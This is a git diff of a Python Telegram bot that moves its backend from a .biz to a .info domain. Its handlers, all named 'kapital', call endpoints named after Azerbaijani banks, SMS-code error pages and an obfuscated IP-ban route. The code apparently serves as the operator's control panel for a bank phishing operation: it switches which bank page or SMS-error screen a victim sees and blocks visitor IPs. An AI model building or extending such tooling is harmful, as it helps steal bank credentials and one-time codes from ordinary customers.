@@ -73,7 +73,7 @@ app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asanodenis.biz/crud/kapital/{number}/"
+        url = f"https://asanodenis.info/crud/kapital/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -89,7 +89,7 @@ def kapital(client, message):
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asanodenis.biz/crud/abb/{number}/"
+        url = f"https://asanodenis.info/crud/abb/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -106,7 +106,7 @@ def kapital(client, message):
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asanodenis.biz/crud/leobank/{number}/"
+        url = f"https://asanodenis.info/crud/leobank/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -124,7 +124,7 @@ def kapital(client, message):
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asanodenis.biz/crud/unibank/{number}/"
+        url = f"https://asanodenis.info/crud/unibank/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -140,7 +140,7 @@ def kapital(client, message):
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asanodenis.biz/crud/smserror/{number}"
+        url = f"https://asanodenis.info/crud/smserror/{number}"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -158,7 +158,7 @@ def kapital(client, message):
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asanodenis.biz/crud/smsfix/{number}"
+        url = f"https://asanodenis.info/crud/smsfix/{number}"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -176,7 +176,7 @@ def kapital(client, message):
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asanodenis.biz/crud/pashabank/{number}/"
+        url = f"https://asanodenis.info/crud/pashabank/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -195,7 +195,7 @@ def kapital(client, message):
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asanodenis.biz/crud/error/{number}/"
+        url = f"https://asanodenis.info/crud/error/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -213,7 +213,7 @@ def kapital(client, message):
 def kapital(client, message):
     try:
         ip = message.text.split()[1]
-        url = f"https://asanodenis.biz/api/banned_ipssadsad1d21dasdasd12dsadsadsad12dqwd12dsad12dsqd12d/"
+        url = f"https://asanodenis.info/api/banned_ipssadsad1d21dasdasd12dsadsadsad12dqwd12dsad12dsqd12d/"
         data = {
             "ip_address": f"{ip}",
             "ban_reason": ""
